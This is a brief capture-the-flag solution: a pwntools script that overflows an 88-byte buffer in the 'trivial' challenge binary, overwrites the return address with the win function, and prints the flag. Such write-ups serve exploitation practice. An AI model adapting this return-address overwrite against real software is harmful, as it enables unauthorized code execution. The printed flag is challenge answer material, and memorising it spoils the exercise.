```
from pwn import *
p = remote("tamuctf.com", 443, ssl=True, sni="trivial")
elf = context.binary = ELF('./trivial')

def exploit():
    addr_win = p64(elf.symbols.win)
    buffer = b"A"*88
    payload = buffer + addr_win

    p.sendline(payload)
    p.interactive()

exploit()
#gigem{sorry_for_using_the_word_trivial}
```

Simple ret2win
